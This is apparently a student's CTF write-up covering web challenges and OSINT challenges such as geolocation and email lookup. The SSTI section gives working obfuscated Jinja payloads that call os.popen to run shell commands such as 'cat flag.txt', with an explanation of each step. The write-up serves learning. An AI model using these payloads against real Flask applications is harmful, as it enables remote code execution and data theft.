# Web Exploitation

## Login Panel

the starting of the challenge consisted of a login pannel that we need tocorrectly aplly the kogin details to get the flag
for that when we inspect the file we het two hask values if we use hash cracker to solve that we  get login details 

### flag

v1t{p4ssw0rd}

### solve 
after looking at the hash i used the online haskcraker to solve for the flag
48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6
48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6	sha256	p4ssw0rd
the first hash was obvious that it was v1t{


## Stylish Flag

in this the flag was hidden if we read the html of the file carefully we see that the class is hidden for the flag. so  what we do is that we go 
inspect click the inspect button and edit the html to remove hidden from there

### flag
v1t{H1D3OUT_CSS}


### solve
when i first saw the challenge i knew that somechanges had to be made either to the html or the css file i read  bot the files carefully and saw that in the html file in the bottom div it is marker with hidden so i removed that and normally ran to see and the flag came on the screen as green pixalaed boxes on the right


##Tiny Flag
spent time in this to find the flag by writng java scrip to increase the size of very small parts to fewpixls but it was very hard and no value showed up.

### flag
v1t{T1NY_ICO}
![Alt text](tiny.png)

### Solve
i tried a lot of methos and they failed so i went to the surce to check for any missed out error but i couldnt find so so i went to the favion.co of the file viewed it raw and got the flag.



## Mark the Lyrics
at first i was very confusd.i could not undertand what to do. atfter that i coverted the veitnamese kyrics into english to understand it. 

### flag
v1t{MCK-cool-ooh-yeh}

### Solve

coverted all the vietnamese lyrics in english and saw that we still coundnt figure out so after that i went to the source and saw the html and saw the file was surrounded by the markdown so i combined all such release and put the value in the english markdowed test.i combined that and removed.



## 5571

this is a server side templeate ingection of jinga .

## flag 
![Alt text](ssti.png)

### Solve
i first read the task went to inspect and saw the src for the blocked content and saw that we cannot use a lot of syntax that would essentially be used in the explate so i url encoded {7*7} so it can the enswer 49. same way i url ecoded {7*"7"} so i got knoe it was jinja. after that i knew the standard payload that is used to i went to the onsecutity site and got the payload. after that i passed these payloads to get the flag
```bash
%7B%7Bconfig|attr(["","","c","l","a","s","s","",""]|join)|attr(["","","i","n","i","t","",""]|join)|attr(["","","g","l","o","b","a","l","s","",""]|join)|attr(%22get%22)([%22o%22,%22s%22]|join)|attr([%22p%22,%22o%22,%22p%22,%22e%22,%22n%22]|join)(%22id%22)|attr([%22r%22,%22e%22,%22a%22,%22d%22]|join)()%7D%7D



%7B%7Bconfig|attr(["","","c","l","a","s","s","",""]|join)|attr(["","","i","n","i","t","",""]|join)|attr(["","","g","l","o","b","a","l","s","",""]|join)|attr(%22get%22)([%22o%22,%22s%22]|join)|attr([%22p%22,%22o%22,%22p%22,%22e%22,%22n%22]|join)([%22l%22,%22s%22,%20%22-a%22]|join)|attr([%22r%22,%22e%22,%22a%22,%22d%22]|join)()%7D%7D


%7B%7Bconfig|attr(["","","c","l","a","s","s","",""]|join)|attr(["","","i","n","i","t","",""]|join)|attr(["","","g","l","o","b","a","l","s","",""]|join)|attr(%22get%22)([%22o%22,%22s%22]|join)|attr([%22p%22,%22o%22,%22p%22,%22e%22,%22n%22]|join)(%22cat%20flag.txt%22)|attr([%22r%22,%22e%22,%22a%22,%22d%22]|join)()%7D%7D
```

```bash
onfig
— the template variable config (often Flask’s app config object) available in the template context.

|attr("class") → config.__class__
— uses Jinja’s attr filter to access the __class__ attribute of the config object.

|attr("init") → config.__class__.init
— accesses the init attribute on the class (in CPython object model __init__ often exists; with obfuscation they may have omitted underscores, but idea is to get to object internals). Many payloads use __init__ or other dunder attributes to reach Python internals.

|attr("globals") → .init.globals
— reaches the class/function globals dictionary — a powerful object containing references to modules and builtins.

|attr("get")(["o","s"]|join) → .globals.get("os")
— calls globals.get("os") to obtain the os module object from the globals dict.

|attr("popen")("cat flag.txt") → os.popen("cat flag.txt")
— uses os.popen() to execute a shell command and return a file-like object for its stdout.

|attr("read")() → .read()
— reads the command output and returns it as the template result, which the attacker sees rendered in the HTTP response
```

in this  i used url encoding anf converted all the context to a list format. this paased the payload easily and got me the flag.

when i ran the second payload it gave me a bunch of information about the file in the system in that i went and cat the flag.txt



# OSINT

## Among US University

in this we see in the expample given that the universilty name we need the first letter of those
so in the image we have we look at that


### flag
v1t{UIT}


### solve

in the question we see the vietnamese written on the top we note that down and we translate that to english we 
“TRƯỜNG ĐẠI HỌC CÔNG NGHỆ THÔNG TIN”

That translates to University of Information Technology, which is part of Vietnam National University, Ho Chi Minh City (VNU-HCM).

So the acronym hidden here is UIT.
and thats how we get the flag

## Dusk Till Dawn

in this we have a picture of a duck and we need to find the location of the park 

### flag 
v1t{Ivey_park}

### solve
![Alt text](duck.png)
searched the image on google by google image saw a lot of instagram photos checked that it was thames river so looked at parks in thames in london cause that picture was from london got the parks chcekd thier photo gallery and ivey park was the one that had the picture in its picture gallery. it had the same image.


## Forgotten inventory

we nneded to find the email of the person who mailed the inventory

### flag
v1t{david.j.hoskins@us.army.mil}


### solve

we searched the internet for the iventory and we come across this email address and we put that as the flag


## Duck Company

in this we have a picture of a duck and we need to find out from where is the duck  like the site name

### flag
v1t{dcuk.com}

### solve 
kind of got accidently i wanted to search duck.com but i did a typo and wrote dcuk.com and got the duck and got the flag


## 16

this took time 

### flag

 v1t{55.592169,37.689097}
 
### solve

i first searched the internet and got a site that had exact the same picture. it was a auction site so i went to the the site. and got this
Red Banner Military Unit 61608 - 100 Years (Communication) Space
then i checked the document from the military unit 61608 i got the pdf i opened that and got the exact lat and long values.








